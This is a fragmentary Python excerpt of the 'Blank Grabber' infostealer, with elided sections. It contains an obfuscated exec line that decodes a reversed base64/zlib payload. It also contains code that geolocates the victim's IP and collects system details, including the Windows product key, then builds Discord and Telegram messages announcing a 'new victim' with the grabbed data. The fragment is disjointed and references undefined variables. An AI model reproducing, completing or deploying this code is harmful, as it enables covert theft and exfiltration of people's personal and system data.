...
callurl = os.getenv('CALL_URL')
twiliosmsurl = os.getenv('TWILIO_SMS_URL')
import subprocess
import sys
import json
import pyaes
...
_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'='))
...
class BlankGrabber:
    ...
    def SendData(self) -> None:
        ...
        try:
            r: dict = json.loads(
            http.request('GET', 'http://ip-api.com/json/?fields=225545')
            ...
            data = (
            f"\nIP: {r.get('query', '(none)')}"
            f"\nRegion: {r.get('regionName', '(none)')}"
            f"\nCountry: {r.get('country', '(none)')}"
            f"\nTimezone: {r.get('timezone', '(none)')}"
            f"\n\n{'Cellular Network:'.ljust(20)} {(chr(9989) if r.get('mobile') else chr(10062))}"
            f"\n{'Proxy/VPN:'.ljust(20)} {(chr(9989) if r.get('proxy') else chr(10062))}"
            )

            # prefer r.get to avoid KeyError
            data += f"\nReverse DNS: {r.get('reverse', '(none)')}"

        except Exception as e:
            # handle the failure (log, set a fallback, or ignore)
            # example: log and set a safe fallback value
            print("Error fetching IP info:", e)
            data = data if 'data' in locals() else ""  # ensure `data` exists / fallback

        finally:
            # optional cleanup (runs whether or not an exception occurred)
            pass


system_info = (
    f"Computer Name: {computerName}\n"
    f"Computer OS: {computerOS}\n"
    f"Total Memory: {totalMemory}\n"
    f"UUID: {uuid}\n"
    f"CPU: {cpu}\n"
    f"GPU: {gpu}\n"
    f"Product Key: {productKey}"
)
...
payload = {
    ...
    'embeds': [{
        ...
        'description': (
            f"**__System Info__\n```autohotkey\n{system_info}```\n"
            f"__IP Info__```prolog\n{ipinfo}```\n"
            f"__Grabbed Info__```js\n{grabbedInfo}```**"
        ),
        'url': 'https://github.com/Blank-c/Blank-Grabber',
        'color': 34303,
        'footer': {'text': 'Grabbed by Blank Grabber | https://github.com/Blank-c/Blank-Grabber'},
...
payload = {
    'caption': (
        f"<b>Blank Grabber</b> got a new victim: <b>{os.getlogin()}</b>\n\n"
        f"<b>IP Info</b>\n<code>{ipinfo}</code>\n\n"
        f"<b>System Info</b>\n<code>{system_info}</code>\n\n"
        f"<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>"
    ).strip(),
    'parse_mode': 'HTML'
}
